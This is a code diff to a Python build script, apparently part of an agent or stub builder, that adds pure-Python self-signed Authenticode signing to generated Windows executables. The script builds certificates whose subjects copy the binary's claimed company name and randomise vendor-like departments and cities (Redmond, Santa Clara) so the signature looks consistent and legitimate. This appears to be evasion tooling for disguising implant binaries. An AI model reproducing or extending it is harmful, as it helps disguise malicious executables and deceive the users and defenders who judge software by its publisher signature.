@@ -23,6 +23,8 @@ Called automatically by build_agent_c.py during the two-pass build.
 """
 
 import argparse
+import datetime
+import hashlib
 import math
 import os
 import random
@@ -343,104 +345,316 @@ END
 """
 
 
-# ── Self-signed Authenticode signing ─────────────────────────────────────
+# ── DER encoding helpers (for Authenticode PKCS#7 construction) ─────────
 
-def _generate_signing_cert(build_dir: Path, company: str) -> tuple:
-    """Generate a fresh self-signed code-signing certificate + key pair.
+def _der_len(length: int) -> bytes:
+    """Encode a DER definite length."""
+    if length < 0x80:
+        return bytes([length])
+    elif length < 0x100:
+        return bytes([0x81, length])
+    elif length < 0x10000:
+        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
+    else:
+        return bytes([0x83, (length >> 16) & 0xFF,
+                      (length >> 8) & 0xFF, length & 0xFF])
 
-    Returns (cert_path, key_path) or (None, None) if openssl is missing.
-    The certificate uses a randomised serial, validity period, and the
-    company name from VERSIONINFO as the CN so the signature looks
-    consistent with the PE metadata.
+
+def _der_tlv(tag: int, value: bytes) -> bytes:
+    """Build a DER Tag-Length-Value triple."""
+    return bytes([tag]) + _der_len(len(value)) + value
+
+
+def _der_seq(*parts: bytes) -> bytes:
+    return _der_tlv(0x30, b''.join(parts))
+
+
+def _der_set(*parts: bytes) -> bytes:
+    return _der_tlv(0x31, b''.join(parts))
+
+
+def _der_oid(dotted: str) -> bytes:
+    """Encode an OBJECT IDENTIFIER from dotted notation."""
+    components = [int(x) for x in dotted.split('.')]
+
+    def _base128(v):
+        if v < 128:
+            return bytes([v])
+        out = []
+        out.append(v & 0x7F)
+        v >>= 7
+        while v:
+            out.append((v & 0x7F) | 0x80)
+            v >>= 7
+        out.reverse()
+        return bytes(out)
+
+    body = _base128(40 * components[0] + components[1])
+    for c in components[2:]:
+        body += _base128(c)
+    return _der_tlv(0x06, body)
+
+
+def _der_int(value: int) -> bytes:
+    """Encode a non-negative INTEGER."""
+    if value == 0:
+        return _der_tlv(0x02, b'\x00')
+    h = format(value, 'x')
+    if len(h) % 2:
+        h = '0' + h
+    b = bytes.fromhex(h)
+    if b[0] & 0x80:
+        b = b'\x00' + b
+    return _der_tlv(0x02, b)
+
+
+def _der_oct(data: bytes) -> bytes:
+    return _der_tlv(0x04, data)
+
+
+def _der_bitstr(data: bytes, unused: int = 0) -> bytes:
+    return _der_tlv(0x03, bytes([unused]) + data)
+
+
+def _der_null() -> bytes:
+    return b'\x05\x00'
+
+
+def _der_utctime(dt: datetime.datetime) -> bytes:
+    return _der_tlv(0x17, dt.strftime('%y%m%d%H%M%SZ').encode('ascii'))
+
+
+# Authenticode OIDs
+_OID_SIGNED_DATA   = '1.2.840.113549.1.7.2'
+_OID_SPC_INDIRECT  = '1.3.6.1.4.1.311.2.1.4'
+_OID_SPC_PE_IMAGE  = '1.3.6.1.4.1.311.2.1.15'
+_OID_SHA256         = '2.16.840.1.101.3.4.2.1'
+_OID_RSA            = '1.2.840.113549.1.1.1'
+_OID_CONTENT_TYPE   = '1.2.840.113549.1.9.3'
+_OID_SIGNING_TIME   = '1.2.840.113549.1.9.5'
+_OID_MESSAGE_DIGEST = '1.2.840.113549.1.9.4'
+
+
+def _sha256_alg_id() -> bytes:
+    """AlgorithmIdentifier for SHA-256."""
+    return _der_seq(_der_oid(_OID_SHA256), _der_null())
+
+
+def _build_spc_indirect_data(pe_hash: bytes) -> bytes:
+    """Build the SpcIndirectDataContent SEQUENCE."""
+    spc_pe_image = _der_seq(
+        _der_bitstr(b'', 0),
+        _der_tlv(0xA0,                                 # [0] EXPLICIT
+            _der_tlv(0xA2,                              # [2] EXPLICIT file
+                _der_tlv(0x80, b'')                     # [0] IMPLICIT BMPString ""
+            )
+        )
+    )
+    spc_attr = _der_seq(_der_oid(_OID_SPC_PE_IMAGE), spc_pe_image)
+    digest_info = _der_seq(_sha256_alg_id(), _der_oct(pe_hash))
+    return _der_seq(spc_attr, digest_info)
+
+
+def _build_auth_attrs_body(content_digest: bytes,
+                           signing_time: datetime.datetime) -> bytes:
+    """Build authenticated attributes (sorted SET OF Attribute).
+
+    Returns raw concatenated DER of the three attributes.
+    Caller wraps in [0] IMPLICIT (0xA0) for PKCS#7 or SET (0x31)
+    for signing.
     """
+    attr_ct = _der_seq(
+        _der_oid(_OID_CONTENT_TYPE),
+        _der_set(_der_oid(_OID_SPC_INDIRECT)),
+    )
+    attr_st = _der_seq(
+        _der_oid(_OID_SIGNING_TIME),
+        _der_set(_der_utctime(signing_time)),
+    )
+    attr_md = _der_seq(
+        _der_oid(_OID_MESSAGE_DIGEST),
+        _der_set(_der_oct(content_digest)),
+    )
+    # DER SET OF: elements sorted by their encoded value
+    return b''.join(sorted([attr_ct, attr_st, attr_md]))
+
+
+def _pe_checksum(data: bytearray) -> int:
+    """Compute PE checksum (same algorithm as Windows imagehlp)."""
+    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
+    csum_off = e_lfanew + 4 + 20 + 64
+    csum = 0
+    top = 1 << 32
+    for i in range(0, len(data) & ~1, 2):
+        if i == csum_off or i == csum_off + 2:
+            continue
+        csum += data[i] | (data[i + 1] << 8)
+        if csum >= top:
+            csum = (csum & 0xFFFF) + (csum >> 16)
+    if len(data) % 2:
+        csum += data[-1]
+        if csum >= top:
+            csum = (csum & 0xFFFF) + (csum >> 16)
+    csum = (csum & 0xFFFF) + (csum >> 16)
+    csum = (csum & 0xFFFF) + (csum >> 16)
+    csum += len(data)
+    return csum & 0xFFFFFFFF
+
+
+# ── Self-signed Authenticode signing (pure Python) ──────────────────────
+
+def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
+    """Self-signed Authenticode signing — pure Python, no external tools.
+
+    Uses the ``cryptography`` library for RSA key generation, X.509
+    certificate creation, and PKCS#1 v1.5 signing.  The Authenticode-
+    specific PKCS#7 / SpcIndirectDataContent / WIN_CERTIFICATE embedding
+    is hand-rolled DER — zero CLI dependencies (no openssl, no
+    osslsigncode).
+
+    Returns True on success, False on failure (best-effort — the
+    unsigned binary is still functional).
+    """
+    try:
+        from cryptography import x509
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import (
+            rsa, padding as asym_padding)
+        from cryptography.x509.oid import NameOID
+    except ImportError:
+        print("[!] cryptography library not installed — signing skipped")
+        return False
+
     rng = random.SystemRandom()
+    exe_path = Path(exe_path)
+    pe_data = bytearray(exe_path.read_bytes())
 
-    if not shutil.which("openssl"):
-        print("[!] openssl not found — Authenticode signing skipped")
-        return None, None
-
-    key_path = build_dir / "sign.key"
-    cert_path = build_dir / "sign.crt"
-
-    # Randomise validity: 1–3 years, start date 0–365 days in the past
-    days_valid = rng.randint(365, 1095)
-    days_offset = rng.randint(0, 365)
-
-    # Randomised OU and L to add uniqueness to the cert subject
-    _OU_POOL = [
-        "Software Engineering", "Product Development", "Driver Development",
-        "Platform Engineering", "Systems Software", "Core Services",
-        "Client Software", "Release Engineering", "Tools Development",
-    ]
-    _LOCALITY_POOL = [
-        "Santa Clara", "Redmond", "Austin", "San Jose", "Taipei",
-        "Round Rock", "Palo Alto", "Irvine", "Fremont", "Hillsboro",
-    ]
-    _STATE_POOL = [
-        "California", "Washington", "Texas", "Oregon",
-    ]
-
-    ou = rng.choice(_OU_POOL)
-    locality = rng.choice(_LOCALITY_POOL)
-    state = rng.choice(_STATE_POOL)
-
-    subject = f"/C=US/ST={state}/L={locality}/O={company}/OU={ou}/CN={company}"
-
-    # Generate RSA key + self-signed cert
-    cmd_key = [
-        "openssl", "req", "-x509", "-newkey", "rsa:2048",
-        "-keyout", str(key_path),
-        "-out", str(cert_path),
-        "-days", str(days_valid),
-        "-nodes",                      # No passphrase on the key
-        "-subj", subject,
-        "-addext", "extendedKeyUsage=codeSigning",
-        "-addext", "keyUsage=digitalSignature",
-    ]
-
-    result = subprocess.run(cmd_key, capture_output=True, text=True)
-    if result.returncode != 0:
-        print(f"[!] openssl cert generation failed: {result.stderr.strip()}")
-        return None, None
-
-    return cert_path, key_path
-
-
-def sign_pe(exe_path: Path, cert_path: Path, key_path: Path,
-            description: str = "") -> bool:
-    """Sign a PE with Authenticode using osslsigncode.
-
-    Returns True on success, False on failure (signing is best-effort —
-    the unsigned binary is still functional).
-    """
-    if not shutil.which("osslsigncode"):
-        print("[!] osslsigncode not found — Authenticode signing skipped")
+    # ── Validate PE ──
+    if pe_data[:2] != b'MZ':
+        print("[!] Not a valid PE — signing skipped")
+        return False
+    e_lfanew = struct.unpack_from('<I', pe_data, 0x3C)[0]
+    if pe_data[e_lfanew:e_lfanew + 4] != b'PE\x00\x00':
+        print("[!] Invalid PE signature — signing skipped")
         return False
 
-    signed_path = exe_path.with_suffix(".signed.exe")
-
-    cmd = [
-        "osslsigncode", "sign",
-        "-certs", str(cert_path),
-        "-key", str(key_path),
-        "-h", "sha256",
-        "-in", str(exe_path),
-        "-out", str(signed_path),
-    ]
-
-    if description:
-        cmd += ["-n", description]
-
-    # Add a plausible-looking timestamp URL placeholder as a comment
-    # (actual timestamping would contact an external server — skip it)
-
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    if result.returncode != 0:
-        print(f"[!] osslsigncode failed: {result.stderr.strip()}")
+    opt_offset = e_lfanew + 4 + 20
+    magic = struct.unpack_from('<H', pe_data, opt_offset)[0]
+    checksum_offset = opt_offset + 64
+    if magic == 0x20b:
+        cert_dd_offset = opt_offset + 144
+    elif magic == 0x10b:
+        cert_dd_offset = opt_offset + 128
+    else:
+        print(f"[!] Unknown PE magic 0x{magic:04x} — signing skipped")
         return False
 
-    # Replace the unsigned binary with the signed one
-    signed_path.replace(exe_path)
+    # ── Generate RSA key + self-signed cert ──
+    private_key = rsa.generate_private_key(
+        public_exponent=65537, key_size=2048)
+
+    _OU = ["Software Engineering", "Product Development",
+           "Driver Development", "Platform Engineering",
+           "Systems Software", "Core Services",
+           "Client Software", "Release Engineering"]
+    _LOC = ["Santa Clara", "Redmond", "Austin", "San Jose",
+            "Round Rock", "Palo Alto", "Irvine", "Hillsboro"]
+    _ST = ["California", "Washington", "Texas", "Oregon"]
+
+    now = datetime.datetime.utcnow()
+    subject = issuer = x509.Name([
+        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, rng.choice(_ST)),
+        x509.NameAttribute(NameOID.LOCALITY_NAME, rng.choice(_LOC)),
+        x509.NameAttribute(NameOID.ORGANIZATION_NAME, company),
+        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, rng.choice(_OU)),
+        x509.NameAttribute(NameOID.COMMON_NAME, company),
+    ])
+
+    cert = (
+        x509.CertificateBuilder()
+        .subject_name(subject)
+        .issuer_name(issuer)
+        .public_key(private_key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(now - datetime.timedelta(days=rng.randint(0, 365)))
+        .not_valid_after(now + datetime.timedelta(days=rng.randint(365, 1095)))
+        .add_extension(
+            x509.ExtendedKeyUsage(
+                [x509.oid.ExtendedKeyUsageOID.CODE_SIGNING]),
+            critical=False)
+        .add_extension(
+            x509.KeyUsage(
+                digital_signature=True, content_commitment=False,
+                key_encipherment=False, data_encipherment=False,
+                key_agreement=False, key_cert_sign=False,
+                crl_sign=False, encipher_only=False,
+                decipher_only=False),
+            critical=True)
+        .sign(private_key, hashes.SHA256())
+    )
+
+    cert_der = cert.public_bytes(serialization.Encoding.DER)
+    issuer_der = cert.issuer.public_bytes()
+    serial_number = cert.serial_number
+
+    # ── Compute Authenticode PE hash ──
+    pe_data[checksum_offset:checksum_offset + 4] = b'\x00' * 4
+    pe_data[cert_dd_offset:cert_dd_offset + 8] = b'\x00' * 8
+
+    pe_hash = hashlib.sha256()
+    pe_hash.update(pe_data[:checksum_offset])
+    pe_hash.update(pe_data[checksum_offset + 4:cert_dd_offset])
+    pe_hash.update(pe_data[cert_dd_offset + 8:])
+    pe_hash = pe_hash.digest()
+
+    # ── Build PKCS#7 SignedData ──
+    spc_content = _build_spc_indirect_data(pe_hash)
+
+    content_digest = hashlib.sha256(spc_content).digest()
+    attrs_body = _build_auth_attrs_body(content_digest, now)
+
+    # Sign authenticated attrs (re-tagged as SET 0x31 for signing)
+    attrs_for_signing = _der_tlv(0x31, attrs_body)
+    signature = private_key.sign(
+        attrs_for_signing, asym_padding.PKCS1v15(), hashes.SHA256())
+
+    signer_info = _der_seq(
+        _der_int(1),
+        _der_seq(issuer_der, _der_int(serial_number)),
+        _sha256_alg_id(),
+        _der_tlv(0xA0, attrs_body),               # authenticatedAttributes [0]
+        _der_seq(_der_oid(_OID_RSA), _der_null()), # digestEncryptionAlgorithm
+        _der_oct(signature),
+    )
+
+    signed_data = _der_seq(
+        _der_int(1),
+        _der_set(_sha256_alg_id()),
+        _der_seq(_der_oid(_OID_SPC_INDIRECT),
+                 _der_tlv(0xA0, spc_content)),     # [0] EXPLICIT content
+        _der_tlv(0xA0, cert_der),                  # certificates [0] IMPLICIT
+        _der_set(signer_info),
+    )
+
+    pkcs7 = _der_seq(
+        _der_oid(_OID_SIGNED_DATA),
+        _der_tlv(0xA0, signed_data),               # [0] EXPLICIT
+    )
+
+    # ── Embed WIN_CERTIFICATE in PE ──
+    win_cert = struct.pack('<IHH', 8 + len(pkcs7), 0x0200, 0x0002) + pkcs7
+    win_cert += b'\x00' * ((8 - len(win_cert) % 8) % 8)  # 8-byte align
+
+    cert_table_rva = len(pe_data)
+    struct.pack_into('<II', pe_data, cert_dd_offset,
+                     cert_table_rva, len(win_cert))
+    pe_data += win_cert
+
+    # Recompute PE checksum
+    struct.pack_into('<I', pe_data, checksum_offset, _pe_checksum(pe_data))
+
+    exe_path.write_bytes(pe_data)
     print(f"[+] Authenticode signature applied (self-signed, SHA-256)")
     return True
 
@@ -545,18 +759,14 @@ def build_stub(
     if shutil.which(strip_cmd):
         subprocess.run([strip_cmd, "--strip-all", str(output_exe)], capture_output=True)
 
-    # ── Self-signed Authenticode signature ──
+    # ── Self-signed Authenticode signature (pure Python) ──
     if sign and _vi_company:
-        # Extract description from .rc for the signature
         _vi_desc = ""
         for line in vi_content.splitlines():
             if '"FileDescription"' in line:
                 _vi_desc = line.split('"')[-2]
                 break
-
-        cert_path, key_path = _generate_signing_cert(build_dir, _vi_company)
-        if cert_path and key_path:
-            sign_pe(output_exe, cert_path, key_path, description=_vi_desc)
+        _sign_pe_python(output_exe, _vi_company, description=_vi_desc)
 
     return output_exe
 
